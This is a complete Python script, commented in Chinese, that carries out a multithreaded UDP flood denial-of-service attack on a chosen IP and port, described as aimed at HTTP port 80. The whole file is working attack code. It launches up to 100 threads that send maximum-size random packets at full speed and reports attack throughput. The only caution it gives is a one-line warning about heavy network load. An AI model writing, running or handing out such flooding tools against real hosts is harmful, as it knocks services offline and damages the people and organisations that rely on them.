#!/usr/bin/env python3
"""
UDP洪水攻击 - 专门针对HTTP端口
通过向80端口发送大量UDP包来干扰TCP服务
"""

import socket
import threading
import time
import random
import sys

class TargetedUDPFlood:
    """针对特定端口的UDP洪水"""
    
    def __init__(self, target_ip, target_port=80, num_threads=100, 
                 duration=60, packet_size=1472):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.duration = duration
        self.packet_size = packet_size
        self.stop_event = threading.Event()
        self.total_packets = 0
        self.lock = threading.Lock()
    
    def _attack_thread(self, thread_id):
        """攻击线程 - 专注单一端口"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # 生成随机payload
        payload = bytes(random.getrandbits(8) for _ in range(self.packet_size))
        
        packet_count = 0
        start_time = time.time()
        end_time = start_time + self.duration if self.duration > 0 else float('inf')
        
        print(f"线程 {thread_id} 开始全速轰击 {self.target_ip}:{self.target_port}")
        
        try:
            while time.time() < end_time and not self.stop_event.is_set():
                try:
                    # 疯狂发送到同一个端口
                    for _ in range(100):  # 批量发送
                        sock.sendto(payload, (self.target_ip, self.target_port))
                        packet_count += 1
                    
                    if packet_count % 10000 == 0:
                        elapsed = time.time() - start_time
                        pps = packet_count / elapsed if elapsed > 0 else 0
                        print(f"线程 {thread_id}: {packet_count} 包, {pps:.0f} pps")
                        
                except Exception as e:
                    continue
                    
        except KeyboardInterrupt:
            pass
        finally:
            sock.close()
            
        elapsed = time.time() - start_time
        pps = packet_count / elapsed if elapsed > 0 else 0
        print(f"线程 {thread_id} 完成: {packet_count:,} 包, {pps:.0f} pps")
        
        with self.lock:
            self.total_packets += packet_count
    
    def start(self):
        print("=" * 70)
        print("💥 极限UDP洪水攻击 - 针对HTTP端口")
        print("=" * 70)
        print(f"目标: {self.target_ip}:{self.target_port}")
        print(f"线程数: {self.num_threads}")
        print(f"包大小: {self.packet_size} 字节 (最大MTU)")
        print(f"策略: 每个线程全速轰击同一端口")
        print(f"持续时间: {self.duration} 秒")
        print("=" * 70)
        print("\n⚠️  警告: 这将产生极高的网络负载!\n")
        
        start_time = time.time()
        threads = []
        
        try:
            for i in range(self.num_threads):
                t = threading.Thread(target=self._attack_thread, args=(i + 1,))
                t.daemon = True
                t.start()
                threads.append(t)
                time.sleep(0.001)  # 快速启动
            
            print(f"{self.num_threads} 个线程已启动!\n")
            
            for t in threads:
                t.join()
                
        except KeyboardInterrupt:
            print("\n\n🛑 停止攻击...")
            self.stop_event.set()
            for t in threads:
                t.join()
        
        elapsed = time.time() - start_time
        total_pps = self.total_packets / elapsed if elapsed > 0 else 0
        total_mbps = (self.total_packets * self.packet_size * 8 / 1000000) / elapsed if elapsed > 0 else 0
        
        print("\n" + "=" * 70)
        print("📊 攻击统计")
        print("=" * 70)
        print(f"总包数: {self.total_packets:,}")
        print(f"持续时间: {elapsed:.1f} 秒")
        print(f"平均速率: {total_pps:,.0f} pps")
        print(f"平均带宽: {total_mbps:.1f} Mbps")
        print("=" * 70)

def main():
    if len(sys.argv) < 2:
        print("用法: python3 targeted_udp_flood.py <target_ip> [port] [threads] [duration]")
        print("\n示例:")
        print("  python3 targeted_udp_flood.py 10.10.20.20")
        print("  python3 targeted_udp_flood.py 10.10.20.20 9999 100 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
    num_threads = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
    
    attack = TargetedUDPFlood(
        target_ip=target_ip,
        target_port=target_port,
        num_threads=num_threads,
        duration=duration,
        packet_size=1472  # 接近MTU最大值
    )
    
    attack.start()

if __name__ == "__main__":
    main()
